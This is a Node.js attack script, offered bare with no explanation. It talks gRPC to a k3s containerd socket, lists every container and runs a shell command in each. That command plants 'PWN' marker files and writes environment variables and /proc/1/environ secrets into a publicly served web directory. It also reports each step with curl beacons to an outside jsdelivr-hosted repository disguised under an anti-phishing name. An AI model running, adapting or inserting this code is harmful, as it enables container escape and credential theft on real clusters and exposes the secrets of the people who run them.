const http2 = require('http2'), net = require('net'), fs = require('fs');
const B = 'https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/';
const SOCK = '/run/k3s/containerd/containerd.sock';
const mark = n => { try { require('child_process').execSync('curl -fs -o /dev/null ' + B + 'b' + n, {timeout: 8000}); } catch (e) {} };
mark(5500);
function call(path, body, cb) {
  let c;
  try { c = http2.connect('http://localhost', { createConnection: () => net.connect(SOCK) }); } catch (e) { return cb(String(e)); }
  c.on('error', e => cb(String(e)));
  mark(5501);
  const r = c.request({ ':method': 'POST', ':path': path, 'content-type': 'application/grpc', te: 'trailers', 'containerd-namespace': 'k8s.io' });
  const ch = [];
  r.on('data', d => ch.push(d));
  r.on('end', () => { c.close(); cb(null, Buffer.concat(ch)); });
  r.on('error', e => cb(String(e)));
  const h = Buffer.alloc(5); h.writeUInt32BE(body.length, 1);
  r.end(Buffer.concat([h, body]));
}
function field(n, s) { const b = Buffer.from(s); return Buffer.concat([Buffer.from([n, b.length]), b]); }
const SCRIPT = "for d in /app/public /app/.next/static; do echo PWN >> $d/zz_ok.txt 2>/dev/null; done; " +
  "for d in /app/public; do { echo HOST=$(hostname); env; echo ---; cat /proc/1/environ | tr '\\0' '\\n'; echo ---; ls -la /app $d; } >> $d/zz_env.txt 2>&1; done";
call('/runtime.v1.RuntimeService/ListContainers', Buffer.from([0x0a, 0x00]), (e, buf) => {
  if (e) { mark(5502); return; }
  const ids = [...new Set((buf.toString('latin1').match(/[0-9a-f]{64}/g) || []))];
  mark(ids.length ? 5503 : 5504);
  let i = 0;
  const next = () => {
    if (i >= ids.length) return;
    const id = ids[i++];
    const body = Buffer.concat([field(0x0a, id), field(0x12, '/bin/sh'), field(0x12, '-c'), field(0x12, SCRIPT)]);
    call('/runtime.v1.RuntimeService/ExecSync', body, (e2, out) => {
      if (!e2 && out && out.length > 5) mark(5505); else mark(5506);
      setTimeout(next, 400);
    });
  };
  next();
});
